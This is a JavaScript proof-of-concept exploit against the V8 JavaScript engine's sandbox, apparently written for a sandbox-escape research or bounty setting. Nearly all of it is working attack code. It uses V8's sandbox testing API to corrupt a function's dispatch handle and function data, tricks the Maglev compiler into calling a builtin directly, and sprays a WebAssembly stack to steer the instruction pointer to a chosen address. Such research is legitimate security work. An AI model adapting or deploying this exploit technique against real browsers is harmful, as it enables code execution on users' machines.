const kHeapObjectTag = 0x1;
const kSmiTagSize = 0x1;
const kJSFunctionType = Sandbox.getInstanceTypeIdFor("JS_FUNCTION_TYPE");
const kDispatchHandleOffset = Sandbox.getFieldOffset(kJSFunctionType, "dispatch_handle");
const kSharedFunctionInfoOffset = Sandbox.getFieldOffset(kJSFunctionType, "shared_function_info");
const kSharedFunctionInfoType = Sandbox.getInstanceTypeIdFor("SHARED_FUNCTION_INFO_TYPE");
const kUnstrustedFunctionDataOffset = Sandbox.getFieldOffset(kSharedFunctionInfoType, "function_data");

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const getPtr = (obj) => Sandbox.getAddressOf(obj) + kHeapObjectTag;
const getField = (obj, offset) => memory.getUint32(getPtr(obj) + offset - kHeapObjectTag, true);
const setField = (obj, offset, value) => memory.setUint32(getPtr(obj) + offset - kHeapObjectTag, value, true);
const setFieldAt = (ptr, offset, value) => memory.setUint32(ptr + offset - kHeapObjectTag, value, true);

const FunctionLogNextExecution = () => {};
// real `FunctionLogNextExecution` builtin is marked as 0 arg, so switch to a 0 arg handle
setField(
    FunctionLogNextExecution,
    kDispatchHandleOffset,
    getField(Function.__proto__, kDispatchHandleOffset)
);
// set untrusted_function_data to trick maglev into directly calling the actual builtin
setFieldAt(
    getField(FunctionLogNextExecution, kSharedFunctionInfoOffset),
    kUnstrustedFunctionDataOffset,
    Sandbox.getBuiltinNames().indexOf("FunctionLogNextExecution") << kSmiTagSize
);

// this and the body of the `imbalancer` are just random things to ensure maglev doesnt inline
// the `imbalancer` and instead calls it by dispatch handle
const x = 0;
const imbalancer = (a0,a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a20,a21,a22,a23,a24,a25,a26,a27,a28,a29,a30,a31,a32,a33,a34,a35,a36,a37) => {if(x) [Math.random(), Math.random(), Math.random(), Math.random(), Math.random()]};
%PrepareFunctionForOptimization(imbalancer);
imbalancer();
%OptimizeFunctionOnNextCall(imbalancer);
imbalancer();

// from test/mjsunit/sandbox/regress-430960844.js
let spray_mod = new WebAssembly.Module(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 24, 2, 96, 16, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 0, 96, 1, 126, 0, 2, 15, 1, 2, 106, 115, 8, 115, 112, 114, 97, 121, 95, 99, 98, 0, 0, 3, 2, 1, 1, 7, 9, 1, 5, 115, 112, 114, 97, 121, 0, 1, 10, 38, 1, 36, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 16, 0, 11]));
let { spray } = new WebAssembly.Instance(spray_mod, { js: { spray_cb: () => { } } }).exports;

const DESIRED_RIP = 0x424242424242n;
const pwn = () => {
  // generated maglev code will call this by dispatch handle
  imbalancer();
   // generated maglev code will directly call the actual builtin
   // moreover, it never sets the dispatch handle and the register is never clobbered
   // so the builtin will tail to imbalancer
  FunctionLogNextExecution();
  spray(DESIRED_RIP);
};
%PrepareFunctionForOptimization(pwn);
pwn();
%OptimizeMaglevOnNextCall(pwn);
spray(DESIRED_RIP);
pwn();